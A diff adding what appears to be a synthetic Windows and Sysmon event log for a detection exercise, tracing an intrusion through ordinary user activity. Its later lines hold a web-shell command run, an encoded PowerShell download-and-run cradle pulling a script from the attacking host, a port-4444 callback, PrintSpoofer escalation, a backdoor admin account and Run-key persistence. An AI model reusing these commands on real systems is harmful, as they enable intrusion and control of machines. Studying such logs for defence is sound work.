@@ -1,0 +1,101 @@
+2024-03-15 01:45:12 UTC EventCode=4624 Security TargetUserName=john.smith IpAddress=10.0.0.15 LogonType=2 AuthenticationPackage=Kerberos WorkstationName=CORP-PC01 Status=Success
+
+2024-03-15 01:50:33 UTC EventCode=4688 Sysmon User=CORP\john.smith Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe CommandLine="chrome.exe" CurrentDirectory=C:\Users\john.smith
+
+2024-03-15 01:52:14 UTC EventCode=4688 Sysmon User=CORP\john.smith Image=C:\Program Files\Microsoft Office\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe CommandLine="OUTLOOK.EXE" CurrentDirectory=C:\Users\john.smith
+
+2024-03-15 01:55:01 UTC EventCode=4624 Security TargetUserName=mary.jane IpAddress=10.0.0.22 LogonType=2 AuthenticationPackage=Kerberos WorkstationName=CORP-PC02 Status=Success
+
+2024-03-15 01:58:44 UTC EventCode=4688 Sysmon User=CORP\mary.jane Image=C:\Windows\System32\svchost.exe ParentImage=C:\Windows\System32\services.exe CommandLine="svchost.exe -k netsvcs" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:01:22 UTC EventCode=4624 Security TargetUserName=it.admin IpAddress=10.0.0.5 LogonType=10 AuthenticationPackage=Kerberos WorkstationName=CORP-IT01 Status=Success
+
+2024-03-15 02:03:10 UTC EventCode=4688 Sysmon User=CORP\it.admin Image=C:\Windows\System32\mmc.exe ParentImage=C:\Windows\explorer.exe CommandLine="mmc.exe compmgmt.msc" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:05:55 UTC EventCode=4688 Sysmon User=CORP\john.smith Image=C:\Windows\System32\notepad.exe ParentImage=C:\Windows\explorer.exe CommandLine="notepad.exe report.txt" CurrentDirectory=C:\Users\john.smith\Documents
+
+2024-03-15 02:08:30 UTC EventCode=4634 Security TargetUserName=john.smith LogonType=2 WorkstationName=CORP-PC01
+
+2024-03-15 02:10:05 UTC EventCode=4624 Security TargetUserName=john.smith IpAddress=10.0.0.15 LogonType=2 AuthenticationPackage=Kerberos WorkstationName=CORP-PC01 Status=Success
+
+2024-03-15 02:11:14 UTC EventCode=4688 Sysmon User=CORP\mary.jane Image=C:\Program Files\Microsoft Office\Office16\EXCEL.EXE ParentImage=C:\Windows\explorer.exe CommandLine="EXCEL.EXE budget_2024.xlsx" CurrentDirectory=C:\Users\mary.jane\Documents
+
+2024-03-15 02:12:02 UTC EventCode=4688 Sysmon User=CORP\it.admin Image=C:\Windows\System32\cmd.exe ParentImage=C:\Windows\System32\mmc.exe CommandLine="cmd.exe /c ipconfig /all" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:12:45 UTC EventCode=4688 Sysmon User=CORP\it.admin Image=C:\Windows\System32\ping.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="ping.exe 10.0.0.1" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:13:01 UTC EventCode=3 Sysmon SrcIP=10.0.0.47 DstIP=10.0.0.20 DstPort=80 Protocol=TCP Image=nmap.exe Initiated=true
+
+2024-03-15 02:13:01 UTC EventCode=3 Sysmon SrcIP=10.0.0.47 DstIP=10.0.0.20 DstPort=443 Protocol=TCP Image=nmap.exe Initiated=true
+
+2024-03-15 02:13:02 UTC EventCode=3 Sysmon SrcIP=10.0.0.47 DstIP=10.0.0.20 DstPort=445 Protocol=TCP Image=nmap.exe Initiated=true
+
+2024-03-15 02:13:02 UTC EventCode=3 Sysmon SrcIP=10.0.0.47 DstIP=10.0.0.20 DstPort=3389 Protocol=TCP Image=nmap.exe Initiated=true
+
+2024-03-15 02:13:02 UTC EventCode=3 Sysmon SrcIP=10.0.0.47 DstIP=10.0.0.20 DstPort=8080 Protocol=TCP Image=nmap.exe Initiated=true
+
+2024-03-15 02:13:03 UTC EventCode=3 Sysmon SrcIP=10.0.0.47 DstIP=10.0.0.20 DstPort=135 Protocol=TCP Image=nmap.exe Initiated=true
+
+2024-03-15 02:13:03 UTC EventCode=3 Sysmon SrcIP=10.0.0.47 DstIP=10.0.0.20 DstPort=5985 Protocol=TCP Image=nmap.exe Initiated=true
+
+2024-03-15 02:13:50 UTC EventCode=4688 Sysmon User=CORP\mary.jane Image=C:\Windows\System32\svchost.exe ParentImage=C:\Windows\System32\services.exe CommandLine="svchost.exe -k LocalService" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:14:10 UTC EventCode=4624 Security TargetUserName=it.admin IpAddress=10.0.0.5 LogonType=10 AuthenticationPackage=Kerberos WorkstationName=CORP-IT01 Status=Success
+
+2024-03-15 02:14:30 UTC EventCode=4688 Sysmon User=CORP\it.admin Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="powershell.exe Get-Service" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:15:22 UTC EventCode=4625 Security TargetUserName=admin IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:23 UTC EventCode=4625 Security TargetUserName=admin IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:24 UTC EventCode=4625 Security TargetUserName=admin IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:25 UTC EventCode=4625 Security TargetUserName=admin IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:26 UTC EventCode=4625 Security TargetUserName=administrator IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:27 UTC EventCode=4625 Security TargetUserName=administrator IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:28 UTC EventCode=4625 Security TargetUserName=administrator IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:29 UTC EventCode=4625 Security TargetUserName=svc_web IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:30 UTC EventCode=4625 Security TargetUserName=svc_web IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:31 UTC EventCode=4625 Security TargetUserName=svc_web IpAddress=10.0.0.47 LogonType=3 FailureReason=%%2313 WorkstationName=KALI-PC Status=Failed
+
+2024-03-15 02:15:37 UTC EventCode=4624 Security TargetUserName=svc_web IpAddress=10.0.0.47 LogonType=3 AuthenticationPackage=NTLM WorkstationName=KALI-PC Status=Success
+
+2024-03-15 02:15:38 UTC EventCode=4672 Security SubjectUserName=svc_web PrivilegeList=SeDebugPrivilege,SeImpersonatePrivilege LogonType=3
+
+2024-03-15 02:16:00 UTC EventCode=4688 Sysmon User=CORP\john.smith Image=C:\Windows\System32\notepad.exe ParentImage=C:\Windows\explorer.exe CommandLine="notepad.exe meeting_notes.txt" CurrentDirectory=C:\Users\john.smith\Desktop
+
+2024-03-15 02:16:20 UTC EventCode=4688 Sysmon User=CORP\mary.jane Image=C:\Program Files\Zoom\bin\Zoom.exe ParentImage=C:\Windows\explorer.exe CommandLine="Zoom.exe" CurrentDirectory=C:\Users\mary.jane
+
+2024-03-15 02:16:45 UTC EventCode=1 Sysmon User=CORP\svc_web ParentImage=C:\inetpub\wwwroot\upload\cmd.aspx Image=C:\Windows\System32\cmd.exe CommandLine="cmd.exe /c whoami" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:16:48 UTC EventCode=1 Sysmon User=CORP\svc_web ParentImage=C:\Windows\System32\cmd.exe Image=C:\Windows\System32\cmd.exe CommandLine="cmd.exe /c net user" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:16:55 UTC EventCode=1 Sysmon User=CORP\svc_web ParentImage=C:\Windows\System32\cmd.exe Image=C:\Windows\System32\cmd.exe CommandLine="cmd.exe /c net localgroup administrators" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:17:30 UTC EventCode=1 Sysmon User=CORP\svc_web ParentImage=C:\Windows\System32\cmd.exe Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA0ADcAOgA4ADAAOAAwAC8AcgBlAHYALgBwAHMAMQAnACkA" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:17:31 UTC EventCode=3 Sysmon User=CORP\svc_web Image=powershell.exe SrcIP=10.0.0.20 DstIP=10.0.0.47 DstPort=4444 Protocol=TCP Initiated=true
+
+2024-03-15 02:18:30 UTC EventCode=1 Sysmon User=CORP\svc_web ParentImage=powershell.exe Image=C:\Windows\Temp\PrintSpoofer64.exe CommandLine="PrintSpoofer64.exe -i -c cmd.exe" CurrentDirectory=C:\Windows\Temp
+
+2024-03-15 02:18:31 UTC EventCode=1 Sysmon User=NT AUTHORITY\SYSTEM ParentImage=C:\Windows\Temp\PrintSpoofer64.exe Image=C:\Windows\System32\cmd.exe CommandLine="cmd.exe" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:18:40 UTC EventCode=4672 Security SubjectUserName=SYSTEM PrivilegeList=SeAssignPrimaryTokenPrivilege,SeTcbPrivilege,SeDebugPrivilege
+
+2024-03-15 02:19:15 UTC EventCode=1 Sysmon User=NT AUTHORITY\SYSTEM ParentImage=cmd.exe Image=C:\Windows\System32\net.exe CommandLine="net user hacker P@ssw0rd123! /add" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:19:16 UTC EventCode=4720 Security TargetUserName=hacker SubjectUserName=SYSTEM WorkstationName=CORP-SRV01
+
+2024-03-15 02:19:20 UTC EventCode=1 Sysmon User=NT AUTHORITY\SYSTEM ParentImage=cmd.exe Image=C:\Windows\System32\net.exe CommandLine="net localgroup administrators hacker /add" CurrentDirectory=C:\Windows\System32
+
+2024-03-15 02:19:21 UTC EventCode=4732 Security MemberName=hacker TargetUserName=Administrators SubjectUserName=SYSTEM WorkstationName=CORP-SRV01
+
+2024-03-15 02:19:45 UTC EventCode=13 Sysmon EventType=SetValue TargetObject=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate Details=C:\Windows\Temp\beacon.exe User=NT AUTHORITY\SYSTEM
+
+2024-03-15 02:20:01 UTC EventCode=4698 Security TaskName=\Microsoft\Windows\Update TaskContent=C:\Windows\Temp\beacon.exe SubjectUserName=SYSTEM WorkstationName=CORP-SRV01
